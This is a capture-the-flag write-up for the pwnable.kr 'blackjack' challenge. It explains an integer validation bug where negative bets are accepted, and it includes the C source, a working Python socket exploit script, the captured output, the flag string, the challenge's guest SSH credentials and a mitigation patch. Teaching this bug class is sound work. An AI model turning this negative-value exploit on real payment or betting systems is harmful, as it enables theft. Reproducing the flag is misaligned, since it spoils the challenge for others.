# URL
https://pwnable.kr/play.php

---

# SSH Credentials
ssh blackjack@pwnable.kr -p2222 (pw:guest)

---

**Challenge:** blackjack  
**Category:** Integer Logic Bug / Input Validation  
**Goal:** Exploit a negative-bet vulnerability in a blackjack game to push cash above $1,000,000 and trigger the flag output.

---

## Challenge Overview

The challenge runs a blackjack game on port **9009** under `asm_pwn` privilege. The player starts with $500. If the player's cash exceeds $1,000,000, the flag is read from a `flag` file and printed.

The betting function accepts a signed integer via `scanf("%d")` but only checks `if (bet > cash)` — it does **not** check for **negative** bets.

---

## Source Code (`blackjack.c`)

Key functions:

### `cash_test()` — Flag Trigger

```c
void cash_test() {
     if (cash <= 0) {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
        FILE* fp = fopen("flag", "r");
        char buf[100];
        memset(buf, 0, 100);
        fread(buf, 1, 100, fp);
        printf("%s\n", buf);
        fclose(fp);
     }
}
```

### `betting()` — The Vulnerability

```c
int betting() {
     printf("\n\nEnter Bet: $");
     scanf("%d", &bet);
     
     if (bet > cash) {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
     }
     else return bet;
}
```

### Win/Loss Cash Logic

```c
// When the player loses:
cash = cash - bet;    // Line 573, 602

// When the player wins:
cash = cash + bet;    // Line 563, 612
```

### Game Flow (`play()`)

```c
void play() {
    // ...
    cash = cash;          // Line 546 — no-op
    cash_test();          // Line 547 — checks if cash > 1000000 at ROUND START
    // deal cards, print totals
    betting();            // Line ~550 — get bet amount
    // hit/stay loop
}
```

---

## Vulnerability Analysis

### The Bug

`scanf("%d", &bet)` reads a **signed** integer. The only validation is `if (bet > cash)`.

If the player bets a **negative** amount:

| Scenario | Bet = -1,000,000 | Cash Before | Cash After |
|----------|-------------------|-------------|------------|
| **Win**  | `cash += bet` → `500 + (-1000000)` | $500 | $-999,500 (bankrupt) |
| **Lose** | `cash -= bet` → `500 - (-1000000)` | $500 | **$1,000,500** (millionaire!) |

The check `if (bet > cash)` passes because `-1000000 < 500`, so the negative bet is accepted.

### Exploit Strategy

1. Bet a large negative number (e.g., `-1000000`)
2. **Lose** the round (go over 21 by hitting repeatedly)
3. `cash = cash - bet = 500 - (-1000000) = 1000500`
4. Say "Y" to play again
5. `cash_test()` at the start of the next round sees `cash > 1000000` → **flag printed**

---

## Exploit Script

```python
import socket
import time

sock = socket.socket()
sock.settimeout(10)
sock.connect(('0', 9009))

# Title screen → Y
data = b''
while b'(Y/N)' not in data:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    except: break
sock.send(b'Y\n')
time.sleep(0.15)

# Menu → 1
data = b''
while b'Choice:' not in data:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    except: break
sock.send(b'1\n')
time.sleep(0.15)

# Wait for bet prompt → negative bet
data = b''
while b'Bet:' not in data:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    except: break
sock.send(b'-1000000\n')
time.sleep(0.2)

# Keep hitting until we bust (lose)
for i in range(25):
    try:
        data = sock.recv(4096)
        if not data: break
        text = data.decode(errors='replace')
        if 'Y/N' in text or 'Play Again' in text:
            break
        if 'Hit' in text:
            sock.send(b'h\n')
            time.sleep(0.1)
    except:
        break

# Play again → cash_test() prints flag
sock.send(b'Y\n')
time.sleep(1)
try:
    sock.settimeout(3)
    while True:
        data = sock.recv(4096)
        if not data: break
        print(data.decode(errors='replace'))
except:
    pass
sock.close()
```

### Execution

Since port 9009 is only reachable from within the pwnable.kr network, run via SSH:

```bash
python3 -c "
import base64, socket, time

# Base64-encoded exploit script (the Python code above)
exec(base64.b64decode('...'))
"
```

Or encode the script and pass it through an `expect` SSH session.

---

## Output

```
[0] '\n\nWould You Like to Hit or Stay?\nPlease Enter H to Hit or S to Stay.\n'
[1] '...\nYour Total is 19\n\nThe Dealer Has a Total of 12\n...'
[2] '...\nYour Total is 29\n\nWoah Buddy, You Went WAY over.\n'
=== ROUND ENDED ===
Sending Y to play again...
RECV: b'\x1b[2J\x1b[1;1HWoohoo_I_am_now_a_MILL10NAIRE!\n\n\nCash: $1000500\n...'
```

The flag appears right after the clear-screen escape codes at the start of round 2.

---

## Flag

```
Woohoo_I_am_now_a_MILL10NAIRE!
```
- The final Flag is **Woohoo_I_am_now_a_MILL10NAIRE**

---

## Root Cause & Mitigation

### Root Cause

The betting function accepts **signed** integers but only validates against exceeding the current cash balance. It does **not** reject **negative** bets.

When a player loses with a negative bet, the cash subtraction `cash - bet` becomes `cash - (-|bet|) = cash + |bet|`, increasing the player's cash.

### Mitigation

Add a lower-bound check in `betting()`:

```c
int betting() {
    printf("\n\nEnter Bet: $");
    scanf("%d", &bet);
    
    if (bet <= 0 || bet > cash) {   // ← reject zero/negative bets too
        printf("\nInvalid bet amount.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
    }
    else return bet;
}
```

### Key Takeaways

| Concept | Detail |
|---------|--------|
| **Challenge Type** | Integer logic bug / input validation |
| **Vulnerability** | No lower bound check on bet amount |
| **Exploit** | Negative bet → loss → cash increases via `cash - (-N)` |
| **Trigger** | `cash_test()` runs at round start, prints flag if cash > $1,000,000 |
| **Fix** | Validate `bet > 0` in addition to `bet <= cash` |
